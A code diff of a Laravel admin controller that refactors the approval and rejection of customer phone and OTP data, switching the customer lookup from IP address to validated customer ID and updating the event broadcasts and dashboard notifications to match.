@@ -32,30 +32,24 @@ class AdminPhoneDataController extends Controller
     public function approve(Request $request): JsonResponse
     {
         $request->validate([
-            'customer_ip' => 'required|string',
+            'customer_id' => 'required|integer|exists:customer_profiles,id',
+            'customer_ip' => 'nullable|string',
         ]);
 
-        $customer = CustomerProfile::where('ip_address', $request->customer_ip)->first();
-
-        if (!$customer) {
-            return response()->json([
-                'success' => false,
-                'message' => 'لم يتم العثور على العميل',
-            ], 404);
-        }
+        $customer = CustomerProfile::findOrFail($request->integer('customer_id'));
 
         $extra = $customer->extra_data ?? [];
 
         // Idempotent — already approved, just re-broadcast
         if (($extra['phone_data_status'] ?? null) === 'approved') {
             try {
-                broadcast(new PhoneOtpApproved($request->customer_ip))->toOthers();
+                broadcast(new PhoneOtpApproved($customer->session_id, null, $customer->id))->toOthers();
             } catch (\Throwable $e) {
                 Log::warning('Broadcast failed (approvePhoneData re-broadcast): ' . $e->getMessage());
             }
 
-            $this->notifyDashboard($request->customer_ip, 'phone_data_approved');
-            $this->refreshPaymentViewed($request->customer_ip);
+            $this->notifyDashboard($customer, 'phone_data_approved');
+            $this->refreshPaymentViewed($customer);
 
             return response()->json([
                 'success' => true,
@@ -67,13 +61,13 @@ class AdminPhoneDataController extends Controller
         $customer->update(['extra_data' => $extra]);
 
         try {
-            broadcast(new PhoneOtpApproved($request->customer_ip))->toOthers();
+            broadcast(new PhoneOtpApproved($customer->session_id, null, $customer->id))->toOthers();
         } catch (\Throwable $e) {
             Log::warning('Broadcast failed (approvePhoneData): ' . $e->getMessage());
         }
 
-        $this->notifyDashboard($request->customer_ip, 'phone_data_approved');
-        $this->refreshPaymentViewed($request->customer_ip);
+        $this->notifyDashboard($customer, 'phone_data_approved');
+        $this->refreshPaymentViewed($customer);
 
         return response()->json([
             'success' => true,
@@ -87,31 +81,25 @@ class AdminPhoneDataController extends Controller
     public function reject(Request $request): JsonResponse
     {
         $request->validate([
-            'customer_ip' => 'required|string',
+            'customer_id' => 'required|integer|exists:customer_profiles,id',
+            'customer_ip' => 'nullable|string',
             'reason'       => 'nullable|string|max:500',
         ]);
 
-        $customer = CustomerProfile::where('ip_address', $request->customer_ip)->first();
-
-        if (!$customer) {
-            return response()->json([
-                'success' => false,
-                'message' => 'لم يتم العثور على العميل',
-            ], 404);
-        }
+        $customer = CustomerProfile::findOrFail($request->integer('customer_id'));
 
         $extra = $customer->extra_data ?? [];
 
         // Idempotent — already rejected, just re-broadcast
         if (($extra['phone_data_status'] ?? null) === 'rejected') {
             try {
-                broadcast(new PhoneOtpRejected($request->customer_ip, $request->reason))->toOthers();
+                broadcast(new PhoneOtpRejected($customer->session_id, $request->reason, $customer->id))->toOthers();
             } catch (\Throwable $e) {
                 Log::warning('Broadcast failed (rejectPhoneData re-broadcast): ' . $e->getMessage());
             }
 
-            $this->notifyDashboard($request->customer_ip, 'phone_data_rejected');
-            $this->refreshPaymentViewed($request->customer_ip);
+            $this->notifyDashboard($customer, 'phone_data_rejected');
+            $this->refreshPaymentViewed($customer);
 
             return response()->json([
                 'success' => true,
@@ -126,13 +114,13 @@ class AdminPhoneDataController extends Controller
         $customer->update(['extra_data' => $extra]);
 
         try {
-            broadcast(new PhoneOtpRejected($request->customer_ip, $request->reason))->toOthers();
+            broadcast(new PhoneOtpRejected($customer->session_id, $request->reason, $customer->id))->toOthers();
         } catch (\Throwable $e) {
             Log::warning('Broadcast failed (rejectPhoneData): ' . $e->getMessage());
         }
 
-        $this->notifyDashboard($request->customer_ip, 'phone_data_rejected');
-        $this->refreshPaymentViewed($request->customer_ip);
+        $this->notifyDashboard($customer, 'phone_data_rejected');
+        $this->refreshPaymentViewed($customer);
 
         return response()->json([
             'success' => true,
